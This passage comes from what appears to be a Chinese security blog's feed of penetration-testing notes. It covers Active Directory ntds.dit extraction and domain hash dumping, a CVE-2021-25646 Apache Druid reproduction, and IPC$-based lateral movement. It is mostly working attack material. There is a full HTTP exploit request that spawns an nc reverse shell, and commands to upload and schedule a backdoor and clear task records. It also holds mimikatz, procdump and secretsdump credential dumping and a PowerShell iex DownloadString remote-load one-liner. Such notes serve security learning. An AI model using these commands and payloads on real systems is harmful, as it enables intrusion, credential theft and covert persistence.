class="line"># 卸载快照</span><br><span class="line">ntdsutil snapshot "unmount GUID" quit quit</span><br><span class="line"># 删除快照</span><br><span class="line">ntdsutil snapshot "delete GUID" quit quit</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210220174358168.png" alt="image-20210220174358168"></p><h4 id="利用vssadmin提取"><a href="#利用vssadmin提取" class="headerlink" title="利用vssadmin提取"></a>利用vssadmin提取</h4><p>域环境默认安装，支持系统：Server 2008、2012</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询当前系统的快照</span><br><span class="line">vssadmin list shadows</span><br><span class="line"># 创建c盘的快照</span><br><span class="line">vssadmin create shadow /<span class="keyword">for</span>=c:</span><br><span class="line"># 删除快照</span><br><span class="line">vssadmin delete shadows /<span class="keyword">for</span>=c: /quiet</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210220175513824.png" alt="image-20210220175513824"></p><h4 id="利用vssown-vbs提取"><a href="#利用vssown-vbs提取" class="headerlink" title="利用vssown.vbs提取"></a>利用vssown.vbs提取</h4><p>系统默认不支持，可在Microsoft Windows Software Development Kit (SDK)中获得该工具</p><p>64位系统需要使用64位的vshadow.exe，不同系统可供使用的vshadow.exe下载地址：<a href="http://edgylogic.com/blog/vshadow-exe-versions/。" target="_blank" rel="noopener">http://edgylogic.com/blog/vshadow-exe-versions/。</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 查询当前系统的快照</span><br><span class="line">vshadow.exe -q</span><br><span class="line"># 创建快照，-p persistent，备份操作或是重启系统不会删除；-nw no writers，用来提高创建速度；C: 对应c盘</span><br><span class="line">vshadow.exe -p -nw C:</span><br><span class="line"># 删除快照</span><br><span class="line">vshadow -dx=ShadowCopySetId</span><br><span class="line">vshadow -ds=ShadowCopyId</span><br></pre></td></tr></table></figure><h3 id="二、导出ntds-dit的域账号及域散列值"><a href="#二、导出ntds-dit的域账号及域散列值" class="headerlink" title="二、导出ntds.dit的域账号及域散列值"></a>二、导出ntds.dit的域账号及域散列值</h3><h4 id="使用esedbexport恢复ntds-dit并用ntdsxtract导出散列值"><a href="#使用esedbexport恢复ntds-dit并用ntdsxtract导出散列值" class="headerlink" title="使用esedbexport恢复ntds.dit并用ntdsxtract导出散列值"></a>使用esedbexport恢复ntds.dit并用ntdsxtract导出散列值</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 恢复ntds.dit</span></span><br><span class="line"><span class="comment"># kali安装</span></span><br><span class="line">wget https://github.com/libyal/libesedb/releases/download/20170121/libesedb-experimental-20170121.tar</span><br><span class="line">apt-get install autoconf automake autopoint libtool pkgconfig</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo 1dconfig</span><br><span class="line"><span class="comment"># 恢复</span></span><br><span class="line">esedbexport -m tables ntds.dit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出散列值</span></span><br><span class="line"><span class="comment"># 安装ntdsxtract</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/csababarta/ntdsxtract</span><br><span class="line">python setup.py build &amp;&amp; python setup.py install</span><br><span class="line"><span class="comment"># 将导出的ntds.dit.export 文件夹中的datatable.3和link_table.5和system.hive文件一并放入ntdsxtract文件夹中并执行命令，执行完毕会将散列值保存在all_user</span></span><br><span class="line">python dsusers.py datatable.3 link_table.5 output --syshive SYSTEM -–passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee all_user.txt</span><br><span class="line"><span class="comment"># 执行以下命令，以通过分析ntds.dit 导出域内计算机信息，域内所有的计算机信息被导出到csv文件中。</span></span><br><span class="line">python dscomputers.py datatable.3 computer_output --csvoutfile all_computers.csv</span><br></pre></td></tr></table></figure><h4 id="使用impacket工具包导出散列值"><a href="#使用impacket工具包导出散列值" class="headerlink" title="使用impacket工具包导出散列值"></a>使用impacket工具包导出散列值</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导出散列值</span></span><br><span class="line">impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL</span><br><span class="line"><span class="comment"># impacket 还可以直接通过用户名和散列值进行验证，从远程域控制器中读取ntds.dit 并转储域散列值</span></span><br><span class="line">impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 -just-dc PAYLOAD/administrator\@192.168.190.130</span><br></pre></td></tr></table></figure><h4 id="使用NTDSDumpex-exe导出域账号和域散列值"><a href="#使用NTDSDumpex-exe导出域账号和域散列值" class="headerlink" title="使用NTDSDumpex.exe导出域账号和域散列值"></a>使用NTDSDumpex.exe导出域账号和域散列值</h4><p>NTDSDumpex.exe下载地址：<a href="https://github.com/zcgonvh/NTDSDumpEx/releases/download/v0.3/NTDSDumpEx.zip" target="_blank" rel="noopener">https://github.com/zcgonvh/NTDSDumpEx/releases/download/v0.3/NTDSDumpEx.zip</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 将ntds.dit、NTDSDumpex.exe、system.hive 放在同一目录下，执行命令即可导出域账号和散列值。</span><br><span class="line">NTDSDumpEx.exe -d ntds.dit -s system.hive -o hash.txt</span><br></pre></td></tr></table></figure><h4 id="利用dcsync获取域散列值"><a href="#利用dcsync获取域散列值" class="headerlink" title="利用dcsync获取域散列值"></a>利用dcsync获取域散列值</h4><p>有两种方法，mimikatz包含了dcsync，另外就是Invoke-DCSync.ps1脚本</p><p>mimikatz：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 注意：必须使用域管理员权限运行mimikatz才可以</span><br><span class="line"># 导出域内所有用户名及散列值</span><br><span class="line"><span class="function">lsadump::<span class="title">dcsync</span> /<span class="title">domain:pentest</span>.<span class="title">com</span> /<span class="title">all</span> /<span class="title">csv</span></span></span><br><span class="line"><span class="function"># 导出指定用户散列值</span></span><br><span class="line"><span class="function"><span class="title">lsadump</span>::<span class="title">dcsync</span> /<span class="title">domain:pentest</span>.<span class="title">com</span> /<span class="title">user:Dm</span></span></span><br><span class="line"><span class="function"># 在域控运行<span class="title">mimikatz</span>，通过<span class="title">lsass.exe</span>对散列值进行<span class="title">dump</span>操作</span></span><br><span class="line"><span class="function"><span class="title">privilege</span>::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">lsadump</span>::<span class="title">lsa</span> /<span class="title">inject</span></span></span><br></pre></td></tr></table></figure><p>Invoke-DCSync.ps1脚本：</p><p>下载地址：<a href="https://gist.github.com/monoxgas/9d238accd969550136db" target="_blank" rel="noopener">https://gist.github.com/monoxgas/9d238accd969550136db</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-DCSync</span> <span class="literal">-PWDumpFormat</span></span><br></pre></td></tr></table></figure><h4 id="使用MSF获取域散列值"><a href="#使用MSF获取域散列值" class="headerlink" title="使用MSF获取域散列值"></a>使用MSF获取域散列值</h4><p>psexec_ntdsgrab模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/psexec_ntdsgrab</span><br><span class="line"><span class="built_in">set</span> RHOST、SMBDomain、SMBUser、SMBPass</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>配合meterpreter会话导出散列值：前提获取了meterpreter会话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use /windows/gather/credentials/domain_hashdump</span><br><span class="line"><span class="built_in">set</span> session id</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h4 id="其它方法"><a href="#其它方法" class="headerlink" title="其它方法"></a>其它方法</h4><p>另外还可以使用vshadow.exe和<a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="noopener">QuarksPwDump.exe</a>导出</p><h2 id="利用域信任关系的跨域攻击"><a href="#利用域信任关系的跨域攻击" class="headerlink" title="利用域信任关系的跨域攻击"></a>利用域信任关系的跨域攻击</h2><p>跨域攻击通常有以下几种方法：</p><ol><li>常规渗透方法（如Web漏洞）</li><li>利用已知域散列值进行哈希传递PTH或票据传递PTT攻击（如相同的域控管理员密码）</li><li>利用域信任关系进行跨域攻击</li></ol><p>对第三种方法的学习，可参考<a href="https://www.anquanke.com/post/id/152382" target="_blank" rel="noopener">https://www.anquanke.com/post/id/152382</a> <a href="https://www.c0bra.xyz/2021/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F-SID-History%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E5%9F%9F%E4%BF%A1%E4%BB%BB%E6%94%BB%E5%87%BB/。" target="_blank" rel="noopener">https://www.c0bra.xyz/2021/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F-SID-History%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E5%9F%9F%E4%BF%A1%E4%BB%BB%E6%94%BB%E5%87%BB/。</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
            <tag> 域控安全 </tag>
            
            <tag> 跨域攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Druid CVE-2021-25646复现</title>
      <link href="2021/02/03/Apache-Druid-CVE-2021-25646%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/02/03/Apache-Druid-CVE-2021-25646%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h4><p>Apache Druid是一个高性能的实时分析型数据库，旨在对大型数据集进行快速的查询分析（”<a href="https://en.wikipedia.org/wiki/Online_analytical_processing" target="_blank" rel="noopener">OLAP</a>“查询)。Druid最常被当做数据库来用以支持实时摄取、高性能查询和高稳定运行的应用场景，同时，Druid也通常被用来助力分析型应用的图形化界面，或者当做需要快速聚合的高并发后端API，Druid最适合应用于面向事件类型的数据。</p><p>Apache Druid本身默认是未开启授权认证就可以访问页面的，而该漏洞成因是由于一个druid中全局性的问题，开发者在使用Jackson相关的标签时，出现疏漏，使得攻击者可以构造传入的json串来控制一些敏感的参数，从而导致攻击者未授权RCE。</p><p>影响版本：Apache Druid &lt;= 0.20.0</p><h4 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h4><p>参考<a href="https://c.wgpsec.org/p/10042搭建环境并复现" target="_blank" rel="noopener">https://c.wgpsec.org/p/10042搭建环境并复现</a></p><p>POC：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/druid/indexer/v1/sampler</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.111.130:8888</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">If-Modified-Since</span>: Sun, 26 Jan 2020 01:34:18 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 1008</span><br><span class="line"></span><br><span class="line">&#123;"type": "index", "spec": &#123;"ioConfig": &#123;"type": "index", "inputSource": &#123;"type": "inline", "data": "&#123;\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"&#125;"&#125;, "inputFormat": &#123;"type": "json", "keepNullColumns": true&#125;&#125;, "dataSchema": &#123;"dataSource": "sample", "timestampSpec": &#123;"column": "timestamp", "format": "iso"&#125;, "dimensionsSpec": &#123;&#125;, "transformSpec": &#123;"transforms": [], "filter": &#123;"type": "javascript", "dimension": "added", "function": "function(value) &#123;java.lang.Runtime.getRuntime().exec('nc 192.168.111.130 9999 -e /bin/sh')&#125;", "": &#123;"enabled": true&#125;&#125;&#125;&#125;, "type": "index", "tuningConfig": &#123;"type": "index"&#125;&#125;, "samplerConfig": &#123;"numRows": 500, "timeoutMs": 15000&#125;&#125;</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Date</span>: Wed, 03 Feb 2021 02:12:09 GMT</span><br><span class="line"><span class="attribute">Date</span>: Wed, 03 Feb 2021 02:12:09 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding, User-Agent</span><br><span class="line"><span class="attribute">Server</span>: Jetty(9.4.12.v20180830)</span><br><span class="line"><span class="attribute">Content-Length</span>: 46</span><br><span class="line"></span><br><span class="line">&#123;"numRowsRead":0,"numRowsIndexed":0,"data":[]&#125;</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210203102551148.png" alt="image-20210203102551148"></p><p><img src="/imgs/image-20210203102607810.png" alt="image-20210203102607810"></p><h4 id="三、参考链接"><a href="#三、参考链接" class="headerlink" title="三、参考链接"></a>三、参考链接</h4><p><a href="https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw</a></p><p><a href="https://c.wgpsec.org/p/10042" target="_blank" rel="noopener">https://c.wgpsec.org/p/10042</a></p>]]></content>
      
      
      <categories>
          
          <category> Apache Druid </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
            <tag> CVE-2021-25646 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习笔记-Ⅴ：域内横向移动</title>
      <link href="2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-V%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-V%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<p>这是第五章的学习记录汇总…</p><blockquote><p>域内横向移动再内网攻击中被广泛使用，尤其是在APT 高级持续威胁。</p><p>攻击者利用横向移动，以被攻陷主机为跳板，访问其它域内主机 以扩大资产范围，包括包括跳板机器中的文档和存储的凭证、跳板机的数据库连接信息、域控及其它重要资产。</p></blockquote><h3 id="一、常用Windows远程连接（IPC-）和相关命令"><a href="#一、常用Windows远程连接（IPC-）和相关命令" class="headerlink" title="一、常用Windows远程连接（IPC$）和相关命令"></a>一、常用Windows远程连接（IPC$）和相关命令</h3><p>场景：已经获取到目标主机用户明文密码，网络环境较为苛刻，可以用Windows自带工具IPC建立远程连接。</p><p>IPC（Internal Process Connection，空连接）共享“命名管道”资源，能够查看远程主机的共享资源。通过ipc可以与目标主机建立连接，从而访问、上传或下载目标主机的文件及运行其它命令。</p><h4 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 建立一个连接</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span>\ipc$ /user:administrator "passwd"</span><br><span class="line"># 查看当前连接</span><br><span class="line"><span class="built_in">net</span> use</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210202194230744.png" alt="image-20210202194230744"></p><p>IPC连接常见错误提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">错误号5：拒绝访问（本地权限问题）</span><br><span class="line">错误号51：无法找到网络路径（网络问题）</span><br><span class="line">错误号53：找不到网络路径（IP地址错误、目标未开机、目标有防火墙等）</span><br><span class="line">错误号67：找不到网络名（服务未启动、IPC$已被删除）</span><br><span class="line">错误号1219：提供的凭据与已存在的凭据冲突</span><br><span class="line">错误号1326：用户名或密码错误</span><br><span class="line">错误号1792：目标网络服务未启动，包括Netlogon服务未启动（连接域控可能会出现）</span><br><span class="line">错误号2242：密码已过期</span><br></pre></td></tr></table></figure><h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><p>开放了139、445端口；目标开启ipc$文件共享；已获取用户账号密码。</p><h4 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h4><p>可以使用以下命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 列出目标c盘目录</span><br><span class="line"><span class="built_in">dir</span>  \\<span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span>\c$</span><br><span class="line"># 上传文件到目标主机</span><br><span class="line"><span class="built_in">copy</span> plugin_update.exe \\<span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span>\c$\windows\temp\plugin_update.exe</span><br><span class="line"># 查看目标主机进程</span><br><span class="line">TASKLIST /S <span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /U username /P password</span><br><span class="line"># 查看目标主机时间</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span></span><br><span class="line"># 创建计划任务，适用于<span class="number">2008</span>之前的系统</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> <span class="number">1</span>:<span class="number">00</span>PM C:\plugin_update.exe</span><br><span class="line"># 清除任务记录</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> job_id /delete</span><br><span class="line"># 创建计划任务，适用于<span class="number">2008</span>以后的系统</span><br><span class="line">schtasks /create /tn "plugin_update" /tr c:\windows\temp\plugin_update.exe /sc once /st <span class="number">16</span>:<span class="number">32</span> /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /RU System /u administrator /p "passwd"</span><br><span class="line"># 立即启动计划任务</span><br><span class="line">schtasks /run /tn "plugin_update" /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /u administrator /p "passwd"</span><br><span class="line"># 删除计划任务</span><br><span class="line">schtasks /F /delete /tn "plugin_update" /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /u administrator /p "passwd"</span><br></pre></td></tr></table></figure><p>利用IPC上传后门并执行：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 首先建立连接</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span>\ipc$ /user:administrator "passwd"</span><br><span class="line"># 查看目标机器时间</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\<span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span></span><br><span class="line"># 创建计划任务，任务名 plugin_update</span><br><span class="line">schtasks /create /tn "plugin_update" /tr c:\windows\temp\plugin_update.exe /sc once /st <span class="number">13</span>:<span class="number">00</span> /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /RU System</span><br><span class="line"># 也可以立即运行后门程序</span><br><span class="line">schtasks /run /tn "plugin_update" /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span></span><br><span class="line"># 删除创建的任务</span><br><span class="line">schtasks /F /delete /tn "plugin_update" /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span></span><br><span class="line"># 删除IPC</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /<span class="built_in">del</span> /y</span><br></pre></td></tr></table></figure><h3 id="二、Windows系统散列值获取"><a href="#二、Windows系统散列值获取" class="headerlink" title="二、Windows系统散列值获取"></a>二、Windows系统散列值获取</h3><p>在Windows系统中通常使用两种方法对用户明文密码进行加密处理：LM HASH和NTLM HASH。</p><p>LM HASH全名LAN Manager Hash，是微软为了提高Windows系统安全性而采用的散列加密算法，本质是DES加密，LM HASH较容易被破解，从Windows2008开始系统默认禁用LM HASH，如果被禁用，一般用工具抓取的LM HASH值为<code>aad3b435b51404eeaad3b435b51404ee</code>(代表空值或禁用)。</p><p>MTLN HASH是微软为了提高安全性的同时保证兼容性而设计的加密算法，是基于MD4加密算法加密的。从Windows2003以后，Windows认证方式均为NTLM HASH。</p><p>Windows hash结构<code>username:RID:LM-HASH:NT-HASH</code>。</p><h4 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h4><p>System权限</p><h4 id="利用工具及方法："><a href="#利用工具及方法：" class="headerlink" title="利用工具及方法："></a>利用工具及方法：</h4><h5 id="1、GetPass获取明文密码"><a href="#1、GetPass获取明文密码" class="headerlink" title="1、GetPass获取明文密码"></a>1、GetPass获取明文密码</h5><h5 id="2、PwDump7"><a href="#2、PwDump7" class="headerlink" title="2、PwDump7"></a>2、PwDump7</h5><p>可以获取系统所有账户的NTLM HASH，然后通过彩虹表破解hash或者用哈希传递的方法进行横向渗透</p><h5 id="3、Mimikatz"><a href="#3、Mimikatz" class="headerlink" title="3、Mimikatz"></a>3、Mimikatz</h5><p>mimikatz是一款c语言编写的轻量级系统调试工具，该工具可以从内存中提取明文密码、散列值、PIN和Kerberos票据，也可以执行哈希传递、票据传递以及构建黄金票据（Golden Ticket）。</p><p>通过SAM和SYSTEM文件抓取密码</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 方法<span class="number">1</span></span><br><span class="line"># 导出SAM和System文件</span><br><span class="line">reg save HKLM\SAM same.hive</span><br><span class="line">reg save HKLM\SYSTEM system.hive</span><br><span class="line"># 使用mimikatz读取sam、system文件</span><br><span class="line"><span class="function">lsadump::<span class="title">sam</span> /<span class="title">sam:sam</span>.<span class="title">hive</span> /<span class="title">system:system</span>.<span class="title">hive</span></span></span><br><span class="line"><span class="function"># 方法2 ：直接读取本地<span class="title">SAM</span>文件，导出<span class="title">HASH</span>信息</span></span><br><span class="line"><span class="function"># 提升权限</span></span><br><span class="line"><span class="function"><span class="title">privilege:debug</span></span></span><br><span class="line"><span class="function"><span class="title">token</span>::<span class="title">elevate</span></span></span><br><span class="line"><span class="function"># 读取本地<span class="title">SAM</span>获取<span class="title">NTLM</span> <span class="title">HASH</span></span></span><br><span class="line"><span class="function"><span class="title">lsadump</span>::<span class="title">sam</span></span></span><br></pre></td></tr></table></figure><h4 id="使用mimikatz在线读取SAM文件"><a href="#使用mimikatz在线读取SAM文件" class="headerlink" title="使用mimikatz在线读取SAM文件"></a>使用mimikatz在线读取SAM文件</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimkatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"</span><br></pre></td></tr></table></figure><h4 id="使用mimikatz离线读取lsass-dmp文件"><a href="#使用mimikatz离线读取lsass-dmp文件" class="headerlink" title="使用mimikatz离线读取lsass.dmp文件"></a>使用mimikatz离线读取lsass.dmp文件</h4><p>lsass.exe进程：Local Security Authority Service、本地安全权限服务，用于本地安全和登录策略</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 使用微软官方提供的工具procdump导出lsass.dmp文件</span><br><span class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"># 使用mimikatz导出lsass.dmp文件中的密码散列值，如果出现switch to minidump表示加载成功</span><br><span class="line"><span class="function">sekurlsa::<span class="title">minidump</span> <span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function"># 导出密码<span class="title">hash</span>值</span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonPasswords</span> <span class="title">dull</span></span></span><br></pre></td></tr></table></figure><h4 id="使用Powershell进行hash-dump"><a href="#使用Powershell进行hash-dump" class="headerlink" title="使用Powershell进行hash dump"></a>使用Powershell进行hash dump</h4><p>Nishang的Get-PassHashes.ps1可以导出hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 以管理员权限打开powershell，进入Nishang目录</span><br><span class="line">Import-Module .\Get-PassHashes.ps1</span><br><span class="line">Get-PassHashes</span><br><span class="line"># 通过远程加载来执行</span><br><span class="line">powershell iex (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.15.216:8888&#x2F;Gather&#x2F;Get-PassHashes.ps1&#39;);Get-PassHashes</span><br></pre></td></tr></table></figure><h4 id="使用MSF进行hash-dump"><a href="#使用MSF进行hash-dump" class="headerlink" title="使用MSF进行hash dump"></a>使用MSF进行hash dump</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">run 